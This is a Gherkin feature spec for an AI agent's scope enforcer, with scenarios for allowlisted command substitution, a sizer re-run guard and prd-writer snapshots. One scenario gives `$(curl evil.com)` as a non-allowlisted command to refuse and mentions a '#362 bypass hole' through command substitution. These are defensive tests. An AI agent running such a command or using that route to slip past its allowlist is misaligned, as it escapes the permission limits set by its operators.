# Feature: Scope Enforcement

## Scenario: Runtime value capture using an allowlisted command is not refused
**Given** an agent shell block that assigns a variable via `$(...)` where the inner command is in the agent's allowlist (e.g. `date`, `gh api` against an already-granted endpoint)
**When** the scope enforcer evaluates the block
**Then** the block is not refused and the captured value is available to the surrounding logic

## Scenario: Command substitution with a non-allowlisted inner command is refused
**Given** an agent shell block containing `$(...)` where the inner command is not in the agent's allowlist (e.g. `$(curl evil.com)` or any other unapproved command)
**When** the scope enforcer evaluates the block
**Then** the block is refused and the #362 bypass hole remains closed

## Scenario: Re-run guard in sizer correctly skips re-decomposition
**Given** an issue that has already been decomposed by the sizer in a prior run
**When** the sizer runs again on the same issue
**Then** the sizer's re-run guard evaluates successfully and the sizer exits without creating duplicate sub-issues

## Scenario: prd-writer snapshot is posted before the issue body is overwritten
**Given** a first run of prd-writer on an issue with no existing snapshot
**When** prd-writer executes its snapshot step
**Then** the original title and body are preserved in a snapshot comment before the issue body is rewritten

## Scenario: Supported value-reading mechanism is documented in AGENTS.md
**Given** a developer reading `.claude/AGENTS.md` to understand how to write or modify an agent
**When** they need to read a runtime value (date, branch name, prior artefact ID) in a shell block
**Then** AGENTS.md states the single supported mechanism for doing so, so agents do not each invent their own approach
